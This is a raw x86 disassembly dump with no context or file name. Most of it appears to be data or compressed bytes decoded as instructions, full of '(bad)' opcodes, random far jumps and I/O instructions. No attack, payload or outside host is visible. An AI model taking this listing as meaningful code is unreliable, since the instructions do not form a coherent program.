  4155b6:	add    eax,0x19800000
  4155bb:	add    BYTE PTR [eax-0x8],0x38
  4155bf:	add    BYTE PTR [eax],0xc1
  4155c2:	inc    edx
  4155c3:	sub    DWORD PTR [eax],eax
  4155c5:	or     DWORD PTR [edx],esp
  4155c7:	inc    eax
  4155c8:	xor    DWORD PTR [eax+0x31008582],eax
  4155ce:	and    DWORD PTR [eax],eax
  4155d0:	push   eax
  4155d1:	mov    eax,ds:0x80804220
  4155d6:	cwde   
  4155d7:	pop    eax
  4155d8:	and    cl,BYTE PTR [ecx+0x10288008]
  4155de:	mov    al,ds:0x41420160
  4155e3:	call   0x5955ec
  4155e8:	add    BYTE PTR [edi],al
  4155ea:	push   ecx
  4155eb:	add    DWORD PTR [edi+0x10948038],eax
  4155f1:	and    al,0x0
  4155f3:	add    BYTE PTR [eax+ebp*1],al
  4155f6:	mov    cl,0x8
  4155f8:	inc    eax
  4155f9:	add    DWORD PTR [ecx],eax
  4155fb:	inc    ecx
  4155fc:	adc    BYTE PTR [ebp+0x10],0x18
  415600:	add    BYTE PTR [eax],dl
  415602:	inc    ebx
  415603:	pop    ecx
  415604:	and    DWORD PTR [eax],0xffffff80
  415607:	add    BYTE PTR [edi+eax*2+0x23],al
  41560b:	add    DWORD PTR [edx+eax*1+0x0],esp
  41560f:	add    BYTE PTR [eax],dl
  415611:	or     BYTE PTR [eax],bh
  415613:	add    BYTE PTR [eax],dh
  415615:	add    BYTE PTR [eax],al
  415617:	and    eax,0xca11800
  41561c:	add    BYTE PTR [esi+0x5],0x80
  415620:	add    BYTE PTR [eax+eax*1-0x77],dh
  415624:	add    BYTE PTR [eax+0x5c],dl
  415627:	and    BYTE PTR [edx-0x57],al
  41562a:	inc    edx
  41562b:	adc    DWORD PTR ds:0x610000,ecx
  415631:	and    eax,0x90e20240
  415636:	and    BYTE PTR [ecx],al
  415638:	add    BYTE PTR [edx],al
  41563a:	loopne 0x41564c
  41563c:	add    BYTE PTR [eax+0x54],ah
  41563f:	add    BYTE PTR [edx],dl
  415641:	add    BYTE PTR [ecx+0x40],0x48
  415645:	add    al,0x14
  415647:	xor    BYTE PTR fs:[eax+eax*1],0xa
  41564c:	and    esp,DWORD PTR ds:0x1010288
  415652:	sub    BYTE PTR [eax],al
  415654:	add    DWORD PTR [ecx+0x48],esp
  415657:	push   es
  415658:	add    BYTE PTR [eax],0xba
  41565b:	pop    esi
  41565c:	sbb    al,0x0
  41565e:	and    BYTE PTR [eax],al
  415660:	and    BYTE PTR [ebx],al
  415662:	and    BYTE PTR [ecx+0x40],ah
  415665:	push   es
  415666:	or     BYTE PTR [edx+0x1460008],al
  41566c:	inc    esp
  41566d:	add    BYTE PTR [eax-0x74],dl
  415670:	add    BYTE PTR [eax],0x20
  415673:	add    BYTE PTR [eax+0x1801c2],cl
  415679:	inc    eax
  41567a:	add    BYTE PTR [edx+0x610000],cl
  415680:	add    BYTE PTR [ebx+0xa],al
  415683:	push   0xffffff88
  415685:	dec    ax
  415687:	add    DWORD PTR [ecx],eax
  415689:	or     BYTE PTR [eax],al
  41568b:	shl    BYTE PTR [eax],1
  41568d:	sub    BYTE PTR [edx],ah
  41568f:	or     BYTE PTR [eax],al
  415691:	or     BYTE PTR [eax],0x1
  415694:	pop    ecx
  415695:	adc    BYTE PTR [edx+ecx*1],al
  415698:	adc    BYTE PTR [edx+0x22],al
  41569b:	mov    al,BYTE PTR [eax]
  41569d:	adc    BYTE PTR [eax+0x42004080],0x2
  4156a4:	add    dl,BYTE PTR [eax+0x0]
  4156a7:	or     ah,BYTE PTR [edx+0x0]
  4156aa:	xor    BYTE PTR [eax+edx*1],dl
  4156ad:	xchg   ebx,eax
  4156ae:	lods   al,BYTE PTR ds:[esi]
  4156af:	rcl    BYTE PTR [eax+edx*2+0x8],0x61
  4156b4:	add    BYTE PTR [ebp+0x0],dl
  4156b7:	and    al,BYTE PTR [ecx]
  4156b9:	add    al,BYTE PTR [ecx]
  4156bb:	rcl    DWORD PTR [edx],0x8
  4156be:	add    BYTE PTR [eax-0x7f7f7740],al
  4156c4:	add    BYTE PTR [eax+ecx*1],0x0
  4156c8:	add    BYTE PTR [eax],0x2
  4156cb:	add    BYTE PTR [eax],al
  4156cd:	add    DWORD PTR [eax],ebx
  4156cf:	add    BYTE PTR [ebp+0x0],al
  4156d2:	push   eax
  4156d3:	dec    ecx
  4156d4:	nop
  4156d5:	add    BYTE PTR [edx],dh
  4156d7:	add    DWORD PTR [eax+0x40],eax
  4156da:	les    ecx,FWORD PTR [eax+ecx*4]
  4156dd:	mov    al,0x0
  4156df:	inc    edx
  4156e0:	add    BYTE PTR [eax+ecx*4],al
  4156e3:	and    BYTE PTR [edx+0xd1b0],al
  4156e9:	add    BYTE PTR [esi],al
  4156eb:	pusha  
  4156ec:	add    DWORD PTR [edx],esi
  4156ee:	add    DWORD PTR [edx],ecx
  4156f0:	add    BYTE PTR [edx],al
  4156f2:	test   BYTE PTR [eax],cl
  4156f4:	lea    eax,[eax]
  4156f6:	add    al,BYTE PTR [esi]
  4156f8:	add    eax,DWORD PTR [edx]
  4156fa:	push   eax
  4156fb:	add    BYTE PTR [ecx+0x30041820],al
  415701:	test   eax,0x28218025
  415706:	add    BYTE PTR [ecx+eiz*1],dl
  415709:	add    BYTE PTR [ecx],dl
  41570b:	or     BYTE PTR [ecx],ah
  41570d:	add    dl,BYTE PTR [edx]
  41570f:	add    BYTE PTR [edx],al
  415711:	inc    eax
  415712:	add    BYTE PTR [eax],al
  415714:	dec    edi
  415715:	inc    esp
  415716:	add    BYTE PTR [ecx],al
  415718:	add    BYTE PTR [edx+0x2],bl
  41571b:	or     BYTE PTR [ecx],cl
  41571d:	adc    al,BYTE PTR [ecx]
  41571f:	inc    edx
  415720:	or     BYTE PTR [eax+edx*1+0x240a0589],ah
  415727:	inc    ecx
  415728:	push   eax
  415729:	xor    BYTE PTR [ecx],0x21
  41572c:	dec    edx
  41572d:	add    BYTE PTR [eax+0x21812002],al
  415733:	inc    eax
  415734:	dec    eax
  415735:	and    BYTE PTR [ecx+edx*2+0x0],ah
  415739:	and    BYTE PTR [eax],ah
  41573b:	adc    BYTE PTR [eax+0x41],0x40
  41573f:	xor    DWORD PTR [ecx+0x20],0x0
  415743:	push   eax
  415744:	inc    eax
  415745:	or     BYTE PTR [ecx+edx*4],ah
  415748:	sub    BYTE PTR [eax+0x0],0x0
  41574c:	sub    BYTE PTR [edx],ch
  41574e:	inc    esp
  41574f:	add    BYTE PTR [eax+eax*4],ah
  415752:	add    BYTE PTR [eax+0x28],ah
  415755:	add    BYTE PTR [ebp-0x80],ch
  415758:	adc    al,0x81
  41575a:	add    al,0x7f
  41575c:	or     dh,BYTE PTR [ecx+edx*1+0x20]
  415760:	adc    BYTE PTR [eax],cl
  415762:	or     eax,0x1a458100
  415767:	inc    edx
  415768:	and    dl,BYTE PTR [ecx]
  41576a:	adc    dl,BYTE PTR [ebx]
  41576c:	mov    eax,0x206002e8
  415771:	add    BYTE PTR [eax],al
  415773:	add    BYTE PTR [ecx+0x0],bl
  415776:	dec    ecx
  415777:	pop    DWORD PTR [edx]
  415779:	xor    DWORD PTR [edx],ebx
  41577b:	adc    BYTE PTR [eax],al
  41577d:	add    BYTE PTR [eax+ecx*1+0x2],0x80
  415782:	dec    eax
  415783:	add    BYTE PTR [eax-0x7bfff8ff],0x11
  41578a:	and    al,BYTE PTR [edx]
  41578c:	add    ecx,DWORD PTR [eax+0x65004640]
  415792:	or     BYTE PTR [eax-0x80],0x7
  415796:	add    al,0x19
  415798:	and    al,0xc0
  41579a:	add    BYTE PTR [edx],cl
  41579c:	adc    DWORD PTR ds:0x41300089,ecx
  4157a2:	and    BYTE PTR [eax+ebp*4],al
  4157a5:	adc    DWORD PTR [eax],eax
  4157a7:	adc    al,0x0
  4157a9:	or     dl,BYTE PTR [eax]
  4157ab:	mov    al,ds:0x220f040
  4157b0:	add    BYTE PTR [ecx],al
  4157b2:	add    dl,dl
  4157b4:	and    al,0x4
  4157b6:	dec    eax
  4157b7:	dec    eax
  4157b8:	or     BYTE PTR [eax],dl
  4157ba:	adc    BYTE PTR [edx+edx*2],0x90
  4157be:	adc    BYTE PTR [eax],ah
  4157c0:	add    BYTE PTR [eax],al
  4157c2:	sbb    BYTE PTR [ebp+0x0],al
  4157c5:	or     BYTE PTR [edx],cl
  4157c7:	adc    BYTE PTR [eax+0x20000000],al
  4157cd:	test   ecx,eax
  4157cf:	add    DWORD PTR [eax],edx
  4157d1:	pop    eax
  4157d2:	inc    ecx
  4157d3:	add    BYTE PTR [esi],bh
  4157d5:	sbb    eax,0x754e0000
  4157da:	inc    ecx
  4157db:	add    BYTE PTR [edi-0x12fffff2],bl
  4157e1:	add    DWORD PTR [ecx+0x0],0xffffff9f
  4157e5:	push   cs
  4157e6:	add    BYTE PTR [eax],al
  4157e8:	mov    WORD PTR [edx+0x41],ss
  4157ee:	add    BYTE PTR [eax],al
  4157f0:	mov    WORD PTR [edx+0xe9f0041],ss
  4157f6:	add    BYTE PTR [eax],al
  4157f8:	add    al,dl
  4157fa:	inc    ecx
  4157fb:	add    BYTE PTR [ecx+ecx*2],bl
  4157fe:	add    BYTE PTR [eax],al
  415800:	les    eax,FWORD PTR [eax+0x42]
  415803:	add    ch,bh
  415805:	and    eax,DWORD PTR ds:0x0
  41580b:	add    BYTE PTR [eax],al
  41580d:	add    BYTE PTR [eax],al
  41580f:	add    BYTE PTR [esi],cl
  415811:	(bad)  
  415812:	cmc    
  415813:	push   ss
  415814:	adc    BYTE PTR [edx],0xe9
  415817:	test   DWORD PTR ds:0x24061a9f,ecx
  41581d:	xchg   BYTE PTR [eax-0x2a],ch
  415820:	jmp    0x9c03:0xb1019a9c
  415827:	(bad)  
  415829:	push   esi
  41582a:	retf   0x677b
  41582d:	int3   
  41582e:	mov    ebx,0xe8f7c7d8
  415833:	pop    esi
  415834:	sbb    DWORD PTR [esi-0x5],ebp
  415837:	test   eax,0x7519107f
  41583c:	jl     0x4158b9
  41583e:	test   al,0x83
  415840:	repnz cdq 
  415842:	outs   dx,BYTE PTR ds:[esi]
  415843:	aam    0xda
  415845:	mov    eax,edi
  415847:	pusha  
  415848:	ins    WORD PTR es:[edi],dx
  41584a:	push   cs
  41584b:	mov    ah,0x97
  41584d:	addr16 add al,0x64
  415850:	push   0x6b60fe71
  415855:	fs jno 0x41584a
  415858:	sub    edx,ecx
  41585a:	jno    0x4158ad
  41585c:	daa    
  41585d:	adc    ebp,DWORD PTR [eax+0x71d182d3]
  415863:	jae    0x41581f
  415865:	arpl   WORD PTR [edi-0x2c],sp
  415868:	fcmovbe st,st(6)
  41586a:	jno    0x4158d5
  41586c:	jne    0x4158d2
  41586e:	add    ebp,DWORD PTR [edi+0x6e]
  415871:	mov    ds:0x6a76a63f,eax
  415876:	add    eax,0xd626cd4
  41587b:	push   0x680da86e
  415880:	outs   dx,BYTE PTR ds:[esi]
  415881:	(bad)  
  415882:	sbb    al,0x49
  415884:	out    dx,al
  415885:	jne    0x4158c5
  415887:	adc    al,0x4f
  415889:	sub    DWORD PTR [ecx+0x49],0xc36ca8d
  415890:	gs int3 
  415892:	out    0xd9,al
  415894:	sub    al,0x61
  415896:	je     0x41581c
  415898:	dec    edi
  415899:	pop    es
  41589a:	inc    esi
  41589b:	or     ah,bl
  41589d:	add    eax,0x2398d23f
  4158a2:	imul   eax,DWORD PTR [ebx],0x9f6c62f2
  4158a8:	mov    edx,0xdce6b953
  4158ad:	or     bh,ah
  4158af:	loopne 0x4158a9
  4158b1:	jmp    0x92925c2f
  4158b6:	dec    ebp
  4158b7:	mov    eax,0xcbaf0d79
  4158bc:	fiadd  DWORD PTR [ecx+0x1259e7e6]
  4158c2:	jns    0x415899
  4158c4:	fcmovnbe st,st(6)
  4158c6:	adc    BYTE PTR ds:0xd472de55,cl
  4158cc:	fcmovnbe st,st(5)
  4158ce:	jno    0x4158a4
  4158d0:	ficom  DWORD PTR [ebx-0xc]
  4158d3:	retf   
  4158d4:	fcmovb st,st(7)
  4158d6:	in     eax,dx
  4158d7:	sub    al,0xda
  4158d9:	(bad)  
  4158da:	jno    0x415925
  4158dc:	gs into 
  4158de:	in     al,0x16
  4158e0:	fcmovbe st,st(7)
  4158e2:	jno    0x4158b8
  4158e4:	and    esi,edx
  4158e6:	jo     0x4158bc
  4158e8:	fisubr DWORD PTR [edx]
  4158ea:	xor    eax,0x35d06893
  4158ef:	jp     0x415954
  4158f1:	aam    0x45
  4158f3:	hlt    
  4158f4:	xor    ah,cl
  4158f6:	mov    cl,0x5f
  4158f8:	ror    DWORD PTR [ebp-0x29a7af9e],1
  4158fe:	jno    0x4158d4
  415900:	out    dx,eax
  415901:	out    dx,al
  415902:	jecxz  0x415922
  415904:	fcmovbe st,st(7)
  415906:	jno    0x4158dc
  415908:	scas   eax,DWORD PTR es:[edi]
  415909:	fsubr  st,st(5)
  41590b:	aam    0xd9
  41590d:	pusha  
  41590e:	(bad)  
  41590f:	imul   ebx,edx,0xdb688980
  415915:	(bad)  
  415916:	jno    0x415962
  415918:	push   ebp
  415919:	fidiv  DWORD PTR [edx-0x2c]
  41591c:	(bad)  [ecx-0x1a]
  41591f:	mov    esi,0xd471d6aa
  415924:	dec    edi
  415925:	test   BYTE PTR [ebp+0x49],ah
  415928:	mov    dl,cl
  41592a:	out    0xf9,al
  41592c:	out    dx,eax
  41592d:	iret   
  41592e:	out    0xc1,al
  415930:	lahf   
  415931:	add    edi,ebp
  415933:	test   DWORD PTR [edi+0x64],ecx
  415936:	inc    ecx
  415937:	inc    edi
  415938:	sbb    eax,0xdbd472d6
  41593d:	sbb    al,0x71
  41593f:	rcr    edx,cl
  415941:	(bad)  
  415942:	data16 fisub WORD PTR [esi-0x12]
  415946:	or     ah,BYTE PTR [edi]
  415948:	sahf   
  415949:	xchg   ebp,eax
  41594a:	dec    ebp
  41594c:	sahf   
  41594d:	jl     0x415949
  41594f:	shr    DWORD PTR [esi+0x1ac9c6f6],1
  415955:	bound  ebp,QWORD PTR [ebx+ecx*4+0x66]
  415959:	add    al,BYTE PTR [esi+0x71214de9]
  41595f:	aad    0xdb
  415961:	(bad)  
  415962:	inc    ebp
  415963:	(bad)  
  415964:	push   edi
  415965:	xlat   BYTE PTR ds:[ebx]
  415966:	outs   dx,DWORD PTR ds:[esi]
  415967:	pop    esi
  415968:	adc    eax,0xf27e716c
  41596d:	les    esi,FWORD PTR [edx-0x2c]
  415970:	fistp  DWORD PTR [edx-0x29232814]
  415976:	jno    0x4159d6
  415978:	and    eax,0x51bc2f4b
  41597d:	push   ecx
  41597e:	jns    0x415955
  415980:	fcmovnbe st,st(6)
  415982:	cmovns edx,DWORD PTR [ebp-0x22]
  415986:	jb     0x41595c
  415988:	fisttp DWORD PTR [edi+ebp*4]
  41598b:	iret   
  41598c:	fiadd  DWORD PTR [ecx+0x16a7e7e6]
  415992:	adc    DWORD PTR [ebx-0x7602316b],ebx
  415998:	dec    edi
  415999:	jns    0x415a04
  41599b:	sar    DWORD PTR [edi-0x66],1
  41599e:	out    0x78,al
  4159a0:	(bad)
  4159a5:	arpl   WORD PTR [ecx-0x2f],dx
  4159a8:	gs into 
  4159aa:	add    bl,BYTE PTR ds:[edi-0x569ea67d]
  4159b1:	sub    DWORD PTR [esi-0x71],ebp
  4159b4:	shr    BYTE PTR [ecx+esi*2-0x7c],cl
  4159b8:	repnz adc BYTE PTR [ebx-0x2c],dh
  4159bc:	fistp  DWORD PTR [esp+ebp*1+0x2fd366c8]
  4159c3:	jmp    0xd0d05ebb
  4159c8:	xchg   DWORD PTR [edx-0x382d8092],esi
  4159ce:	mov    edx,0x6ef619d1
  4159d3:	rcl    DWORD PTR [edi-0x2d709146],1
  4159d9:	dec    ebx
  4159da:	jno    0x4159ad
  4159dc:	xchg   ebp,eax
  4159dd:	into   
  4159de:	call   0x10fc1072
  4159e3:	or     ebx,DWORD PTR [eax]
  4159e5:	into   
  4159e6:	jno    0x415a67
  4159e8:	dec    edi
  4159e9:	jmp    0xcbfb:0xd7ce5e71
  4159f0:	repnz cmp eax,0xcdbd472
  4159f6:	jmp    0xd2b0:0x2d4fb6cf
  4159fd:	adc    al,0x6d
  4159ff:	aam    0x85
  415a01:	dec    ebx
  415a02:	test   DWORD PTR [eax+0x16],edx
  415a05:	jmp    0xd471:0xd6daec10
  415a0c:	pop    ecx
  415a0d:	stos   BYTE PTR es:[edi],al
  415a0e:	dec    ebp
  415a0f:	inc    edx
  415a10:	(bad)  
  415a11:	xchg   esi,eax
  415a12:	jno    0x415a8d
  415a14:	dec    ebp
  415a15:	push   ebx
  415a16:	jae    0x4159da
  415a18:	call   0x71d8:0x3dec21d6
  415a1f:	aam    0x51
  415a21:	xchg   ecx,eax
  415a22:	jne    0x415a8f
  415a24:	add    esp,DWORD PTR [esi-0x33]
  415a27:	pushf  
  415a28:	(bad)  [eax+0x75]
  415a2b:	jmp    0x415aaa
  415a2d:	xlat   BYTE PTR ds:[ebx]
  415a2e:	jno    0x415a04
  415a30:	push   ecx
  415a31:	xchg   ecx,eax
  415a32:	jns    0x415a9f
  415a34:	nop
  415a35:	inc    ebp
  415a36:	fcmovu st,st(4)
  415a38:	(bad)  [eax+0x75]
  415a3b:	jmp    0x4159ca
  415a3d:	xlat   BYTE PTR ds:[ebx]
  415a3e:	jno    0x415a14
  415a40:	push   ecx
  415a41:	xchg   ecx,eax
  415a42:	jge    0x415a8c
  415a44:	xchg   ebp,eax
  415a45:	fisubr DWORD PTR [ebp-0x6c]
  415a48:	sahf   
  415a49:	(bad)  
  415a4a:	mov    edx,0x2d49c683
  415a4f:	rol    dl,cl
  415a51:	dec    ebx
  415a52:	and    eax,ecx
  415a54:	xlat   BYTE PTR ds:[ebx]
  415a55:	xor    DWORD PTR [ebp+0x4a],0x846de685
  415a5c:	retf   0x1c4d
  415a5f:	call   0x48c6b3b3
  415a64:	gs out 0x35,al
  415a67:	frstor [esi+0x71]
  415a6a:	lds    edx,FWORD PTR [edi+0x487a60f2]
  415a70:	aam    0x49
  415a72:	sub    eax,0x2c9bd6a4
  415a77:	fsub   QWORD PTR [ebp-0x16]
  415a7a:	mov    bh,0xb3
  415a7c:	fcmovbe st,st(6)
  415a7e:	jno    0x415ac7
  415a80:	test   cl,bl
  415a82:	outs   dx,BYTE PTR es:[esi]
  415a84:	pop    ecx
  415a85:	pushf  
  415a86:	pop    es
  415a87:	retf   
  415a88:	data16 ror BYTE PTR [edi+0x26fdefdd],cl
  415a8f:	push   esp
  415a90:	mov    al,ds:0x4fbbfbee
  415a95:	mov    WORD PTR [eax+0x47],?
  415a98:	mov    es,ebp
  415a9a:	ins    BYTE PTR es:[edi],dx
  415a9b:	cdq    
  415a9c:	(bad)  
  415a9d:	out    0xfe,al
  415a9f:	(bad)  
  415aa0:	lahf   
  415aa1:	mov    DWORD PTR [ebp+0x249bd360],eax
  415aa7:	loopne 0x415b0f
  415aa9:	aam    0x86
  415aab:	sbb    DWORD PTR [ecx-0x64],ebx
  415aae:	loope  0x415af3
  415ab0:	dec    edx
  415ab1:	inc    esi
  415ab2:	std    
  415ab3:	mov    ebp,0xe44cd44f
  415ab8:	jmp    0x2186:0x8a9680e5
  415abf:	test   BYTE PTR [ebp-0x30],ah
  415ac2:	icebp  
  415ac3:	pop    ecx
  415ac4:	fsub   st(2),st
  415ac6:	cld    
  415ac7:	into   
  415ac8:	out    dx,eax
  415ac9:	adc    esi,ebp
  415acb:	adc    esi,edx
  415acd:	xlat   BYTE PTR ds:[ebx]
  415ace:	sahf   
  415acf:	jb     0x415ae2
  415ad1:	adc    al,0x6d
  415ad3:	aam    0x85
  415ad5:	dec    ebx
  415ad6:	test   DWORD PTR [ebx+0x4f],esi
  415ad9:	popa   
  415ada:	gs dec ecx
  415adc:	pop    ebp
  415add:	into   
  415ade:	jne    0x415b01
  415ae0:	pop    edx
  415ae1:	mov    ds:0xd4272f96,eax
  415ae6:	mov    DWORD PTR [esi-0x26],esp
  415ae9:	(bad)  
  415aea:	jno    0x415b4d
  415aec:	in     al,0xa2
  415aee:	test   al,0xeb
  415af0:	jbe    0x415ac8
  415af2:	jno    0x415ac8
  415af4:	addr16 mov edx,0x7af2143e
  415afa:	jno    0x415ad0
  415afc:	fisub  DWORD PTR [ebx+0x4e]
  415aff:	and    eax,ebx
  415b01:	xchg   ebp,eax
  415b02:	rol    ebx,0xf2
  415b05:	xchg   BYTE PTR [ecx-0x2c],dh
  415b08:	fcmovb st,st(4)
  415b0a:	mov    cl,0x60
  415b0c:	jecxz  0x415b6e
  415b0e:	xor    ch,BYTE PTR [edx]
  415b10:	out    dx,eax
  415b11:	add    DWORD PTR [ecx+0x71d6da86],ecx
  415b17:	test   eax,0xec61610f
  415b1c:	cwde   
  415b1d:	(bad)  
  415b1e:	jno    0x415af4
  415b20:	out    dx,eax
  415b21:	lods   eax,DWORD PTR ds:[esi]
  415b22:	lds    eax,FWORD PTR [edx]
  415b24:	repnz popa 
  415b26:	and    al,0xc1
  415b28:	adc    ebx,ebp
  415b2a:	push   esp
  415b2b:	inc    ebx
  415b2c:	xchg   edx,eax
  415b2d:	adc    eax,0xee2ecb91
  415b32:	inc    esp
  415b33:	aam    0xda
  415b35:	(bad)  
  415b36:	xor    al,0xd4
  415b38:	pop    ebp
  415b39:	(bad)  
  415b3a:	jno    0x415b9d
  415b3c:	rcl    BYTE PTR [esi+0x75],1
  415b3f:	into   
  415b40:	addr16 shr dh,1
  415b43:	fistp  DWORD PTR [ebx+0x5f]
  415b46:	outs   dx,DWORD PTR ds:[esi]
  415b47:	xchg   ebx,eax
  415b48:	cdq    
  415b49:	inc    ecx
  415b4a:	out    0xe,al
  415b4c:	daa    
  415b4d:	aad    0x1b
  415b4f:	dec    ecx
  415b50:	jecxz  0x415afc
  415b52:	and    eax,0x45867836
  415b58:	fadd   DWORD PTR [esp+edi*8]
  415b5b:	into   
  415b5c:	push   eax
  415b5d:	shr    BYTE PTR [ebx],0xc2
  415b60:	or     BYTE PTR [ebx],dl
  415b62:	or     ebx,DWORD PTR ds:[ecx-0x242b7d12]
  415b69:	(bad)  
  415b6a:	pop    ebp
  415b6b:	or     esi,edx
  415b6d:	out    dx,al
  415b6e:	jno    0x415b44
  415b70:	(bad)  [ebx+0x7f]
  415b73:	adc    BYTE PTR [edi+0x51ac4d5a],ch
  415b79:	pop    edx
  415b7a:	dec    ebp
  415b7b:	mov    eax,0xcbaf0d79
  415b80:	fiadd  DWORD PTR [ecx+0x1257e7e6]
  415b86:	xor    DWORD PTR [ebx+0x4f],0xdaaf6991
  415b8d:	out    0x71,al
  415b8f:	aam    0x74
  415b91:	push   ebp
  415b92:	cmp    DWORD PTR [edi+0x495e6180],eax
  415b98:	mov    bl,BYTE PTR [edx-0x39252610]
  415b9e:	jno    0x415b74
  415ba0:	addr16 into 
  415ba2:	or     edx,DWORD PTR [ebx-0x62]
  415ba5:	aam    0x21
  415ba7:	(bad)  
  415ba8:	iretw  
  415baa:	inc    esp
  415bab:	aam    0xca
  415bad:	(bad)  
  415bae:	jno    0x415b99
  415bb0:	sti    
  415bb1:	dec    esp
  415bb2:	sub    al,0xcc
  415bb4:	repnz aad 0x71
  415bb7:	aam    0xda
  415bb9:	push   ebp
  415bba:	inc    ebp
  415bbb:	mov    al,0x9b
  415bbd:	shl    DWORD PTR [ecx],0xd4
  415bc0:	jg     0x415c0b
  415bc2:	out    dx,al
  415bc3:	loop   0x415b8e
  415bc5:	xchg   esi,eax
  415bc6:	jno    0x415b4c
  415bc8:	repnz in eax,0x74
  415bcb:	aam    0xdb
  415bcd:	dec    esp
  415bce:	sub    al,0xe4
  415bd0:	and    DWORD PTR [esi-0x2c252b95],ebp
  415bd6:	out    0xf6,al
  415bd8:	leave  
  415bd9:	xchg   esi,eax
  415bda:	jno    0x415c27
  415bdc:	(bad)  
  415bdd:	fiadd  WORD PTR [esi]
  415bdf:	xchg   esp,eax
  415be0:	jb     0x415bb8
  415be2:	inc    ecx
  415be3:	aam    0xda
  415be5:	test   DWORD PTR [edi],eax
  415be7:	aam    0x72
  415be9:	mov    WORD PTR [esi+eax*1-0x2f],fs
  415bed:	xlat   BYTE PTR ds:[ebx]
  415bee:	sti    
  415bef:	jecxz  0x415be3
  415bf1:	jecxz  0x415c66
  415bf3:	aam    0xdb
  415bf5:	dec    esp
  415bf6:	sub    al,0xd8
  415bf8:	dec    ebp
  415bf9:	and    esi,DWORD PTR [ecx-0x1929653e]
  415bff:	push   esi
  415c00:	fimul  WORD PTR [edx+0x24]
  415c03:	(bad)  
  415c05:	test   DWORD PTR [ebp-0xa],0x50e431e7
  415c0c:	inc    edx
  415c0d:	shl    DWORD PTR [ecx],0xd4
  415c10:	fcomi  st,st(5)
  415c12:	jecxz  0x415c34
  415c14:	repnz mov esi,0x22dbd431
  415c1a:	xchg   esp,eax
  415c1b:	ret    0xd69a
  415c1e:	sbb    ebp,esp
  415c20:	jl     0x415bfc
  415c22:	jno    0x415bf8
  415c24:	lahf   
  415c25:	push   ebx
  415c26:	nop
  415c27:	ret    0xd69a
  415c2a:	bound  ecx,QWORD PTR [edi-0x49]
  415c2d:	aam    0x71
  415c2f:	aam    0xdb
  415c31:	and    cl,BYTE PTR [edx+eax*8-0x6bf82966]
  415c38:	jb     0x415bdf
  415c3a:	std    
  415c3b:	pop    ss
  415c3c:	pop    ebx
  415c3d:	xlat   BYTE PTR ds:[ebx]
  415c3e:	sti    
  415c3f:	jecxz  0x415c33
  415c41:	xor    esi,DWORD PTR [esp+edx*8-0x25]
  415c45:	dec    esp
  415c46:	sub    al,0xe0
  415c48:	iret   
  415c49:	push   ss
  415c4a:	bound  edx,QWORD PTR [eax-0x29]
  415c4d:	aam    0x71
  415c4f:	aam    0x4f
  415c51:	ficomp WORD PTR [edx]
  415c53:	jge    0x415c47
  415c55:	pop    edx
  415c56:	jae    0x415c2c
  415c58:	fistp  DWORD PTR [edx-0x69361112]
  415c5e:	jno    0x415c25
  415c60:	push   ebp
  415c61:	call   0x871c30d5
  415c66:	sbb    ch,ah
  415c68:	(bad)  
  415c69:	fidiv  DWORD PTR [ecx-0x2c]
  415c6c:	lahf   
  415c6d:	push   ebx
  415c6e:	mov    dl,al
  415c70:	call   0x71d4:0xff4f62d6
  415c77:	aam    0x4f
  415c79:	popa   
  415c7a:	imul   ecx,DWORD PTR [ecx+0x5d],0xda97b7e2
  415c81:	(bad)  
  415c82:	jno    0x415c1f
  415c84:	into   
  415c85:	popf   
  415c86:	call   ecx
  415c88:	out    0x31,eax
  415c8a:	out    0x5e,al
  415c8c:	ror    BYTE PTR [ebx-0xc],cl
  415c8f:	(bad)  
  415c91:	push   edi
  415c92:	xor    eax,0xb9a64d1
  415c97:	dec    ecx
  415c98:	xchg   esp,eax
  415c99:	ror    BYTE PTR [ebx],0x4b
  415c9c:	xchg   ebx,eax
  415c9d:	shl    dh,0x86
  415ca0:	out    0xd2,al
  415ca2:	sub    BYTE PTR [eax+0x6a1dd670],bl
  415ca8:	call   0x6960:0xdb83ffd7
  415caf:	ins    BYTE PTR es:[edi],dx
  415cb0:	stos   DWORD PTR es:[edi],eax
  415cb1:	addr16 imul eax,esp,0xffffffdb
  415cb5:	pusha  
  415cb6:	sub    ebx,0xd471d9af
  415cbc:	or     BYTE PTR [ebx-0xc],0xcb
  415cc0:	dec    edi
  415cc1:	popa   
  415cc2:	jge    0x415d0c
  415cc4:	or     al,0xd3
  415cc6:	and    ebx,DWORD PTR [eax-0x1ee272b1]
  415ccc:	ss dec ebx
  415cce:	adc    al,0xcc
  415cd0:	xlat   BYTE PTR ds:[ebx]
  415cd1:	jnp    0x415d08
  415cd3:	lds    esp,FWORD PTR [ebx]
  415cd5:	mov    ebp,DWORD PTR [ebx-0x3b]
  415cd8:	and    esp,DWORD PTR [ebx+0x5d]
  415cdb:	inc    edi
  415cdc:	mov    ax,0x7e59
  415ce0:	mov    DWORD PTR [ebx-0xc],ecx
  415ce3:	retf   
  415ce4:	xlat   BYTE PTR ds:[ebx]
  415ce5:	pop    eax
  415ce6:	gs dec ecx
  415ce8:	mov    esi,cs
  415cea:	out    0x90,al
  415cec:	mov    ds:0xe30c6e8e,al
  415cf1:	add    eax,0xed190c4e
  415cf6:	outs   dx,BYTE PTR ds:[esi]
  415cf7:	mov    eax,ds:0x48c5e31a
  415cfc:	mov    esi,es
  415cfe:	out    0x55,al
  415d00:	into   
  415d01:	dec    ebx
  415d02:	sti    
  415d03:	mov    edi,0xd07d61d7
  415d08:	pop    ebp
  415d09:	into   
  415d0a:	jle    0x415d3b
  415d0c:	cmp    DWORD PTR [eax-0x12],0xa4f4b20d
  415d13:	aam    0x65
  415d15:	loop   0x415d1f
  415d17:	aaa    
  415d18:	mov    esp,0x65d50e6b
  415d1d:	out    0x88,al
  415d1f:	pmaxub mm2,mm6
  415d22:	jno    0x415d6c
  415d24:	dec    edi
  415d25:	push   edx
  415d26:	jno    0x415cfc
  415d28:	(bad)  
  415d2a:	add    eax,0x71563f49
  415d2f:	aam    0xda
  415d31:	rcl    DWORD PTR [esp+ecx*8],cl
  415d34:	dec    edi
  415d35:	arpl   WORD PTR [ebp-0x37],sp
  415d38:	in     al,0x61
  415d3a:	push   ss
  415d3b:	shl    DWORD PTR [ebp-0x32],1
  415d3e:	sbb    ebp,esp
  415d40:	popa   
  415d41:	(bad)  [ecx-0x2c]
  415d44:	iret   
  415d45:	push   ss
  415d46:	cld    
  415d47:	rol    DWORD PTR [esi+ebp*2-0x68e6e91c],0x72
  415d4f:	pop    esi
  415d50:	jmp    0x65d6:0xdbd7dfed
  415d57:	adc    al,0x66
  415d59:	lahf   
  415d5a:	out    0x3,al
  415d5c:	dec    edi
